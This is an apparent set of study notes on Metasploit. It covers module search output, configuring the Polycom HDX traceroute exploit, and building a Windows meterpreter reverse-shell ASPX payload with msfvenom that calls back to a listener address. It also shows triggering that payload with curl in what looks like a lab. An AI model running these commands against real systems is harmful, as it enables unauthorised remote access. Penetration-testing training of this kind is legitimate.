# Metasploit

Metasploit is a penetration testing framework that makes hacking simple. It is a powerful tool that can be used to exploit vulnerabilities in a system.

## Usage

To use Metasploit, you need to start the Metasploit console by running the following command:

```bash
msfconsole
```

Once you have started the Metasploit console, you can use the `search` command to search for exploits, payloads, and other modules. For example, to search for exploits that target a specific service, you can run the following command:

```bash
search <service>

msf6 > search OpenSSL

Matching Modules
================

   #   Name                                                  Disclosure Date  Rank       Check  Description
   -   ----                                                  ---------------  ----       -----  -----------
   0   payload/bsd/x86/exec                                                   normal     No     BSD Execute Command
   1   payload/osx/x86/exec                                                   normal     No     OS X Execute Command
   2   auxiliary/server/openssl_altchainsforgery_mitm_proxy  2015-07-09       normal     No     OpenSSL Alternative Chains Certificate Forgery MITM Proxy
   3   auxiliary/dos/ssl/dtls_changecipherspec               2000-04-26       normal     No     OpenSSL DTLS ChangeCipherSpec Remote DoS
   4   auxiliary/dos/ssl/dtls_fragment_overflow              2014-06-05       normal     No     OpenSSL DTLS Fragment Buffer Overflow DoS
   5   auxiliary/server/openssl_heartbeat_client_memory      2014-04-07       normal     No     OpenSSL Heartbeat (Heartbleed) Client Memory Exposure
   6   auxiliary/scanner/ssl/openssl_heartbleed              2014-04-07       normal     Yes    OpenSSL Heartbeat (Heartbleed) Information Leak
   7   auxiliary/scanner/ssl/openssl_ccs                     2014-06-05       normal     No     OpenSSL Server-Side ChangeCipherSpec Injection Scanner
   8   auxiliary/dos/ssl/openssl_aesni                       2013-02-05       normal     No     OpenSSL TLS 1.1 and 1.2 AES-NI DoS
   9   exploit/unix/misc/polycom_hdx_traceroute_exec         2017-11-12       excellent  Yes    Polycom Shell HDX Series Traceroute Command Execution
   10  auxiliary/scanner/ssl/ssl_version                     2014-10-14       normal     No     SSL/TLS Version Detection
   11  payload/cmd/unix/reverse_openssl                                       normal     No     Unix Command Shell, Double Reverse TCP SSL (openssl)


Interact with a module by name or index. For example info 11, use 11 or use payload/cmd/unix/reverse_openssl
```

To use an exploit, you can use the `use` command followed by the name or index of the exploit. For example, to use the `exploit/unix/misc/polycom_hdx_traceroute_exec` exploit, you can run the following command:

```bash
msf6 > use exploit/unix/misc/polycom_hdx_traceroute_exec 
[*] Using configured payload cmd/unix/reverse
msf6 exploit(unix/misc/polycom_hdx_traceroute_exec) > options

Module options (exploit/unix/misc/polycom_hdx_traceroute_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CBHOST                     no        The listener address used for staging the final payload
   CBPORT                     no        The listener port used for staging the final payload
   PASSWORD                   no        Password to access console interface if required.
   RHOSTS                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     23               yes       The target port (TCP)


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.
```

Using options as we can see above, we can set the required options for the exploit. To set an option, you can use the `set` command followed by the option name and value. For example, to set the `RHOSTS` option to `

```bash
msf6 exploit(unix/misc/polycom_hdx_traceroute_exec) > set RHOSTS 10.10.11.3
RHOSTS => 10.10.11.3
```

Then to run the exploit, you can use the `run`

## Reverse Shell

If we can upload a file to the target machine, we can upload a reverse shell.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=4444 -f aspx > devel.aspx
```

Then we can use the `exploit/multi/handler` module to listen for the incoming connection.

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST MACHINE_IP
set LPORT 4444
run
```

Then we can navigate to the `devel.aspx` file on the target machine to get a reverse shell.

```bash
curl http://10.10.10.5/devel.aspx
```

And now in the metaexploit console we should see the following:

```bash
[*] Sending stage (175174 bytes) to
[*] Meterpreter session 1 opened

meterpreter > sessions -i 1
```

## Meterpreter

Once we have a reverse shell, we can use the Meterpreter shell to interact with the target machine. We can use the following commands to interact with the Meterpreter shell:

- `sysinfo`: Get system information
- `getuid`: Get the user that the process is running as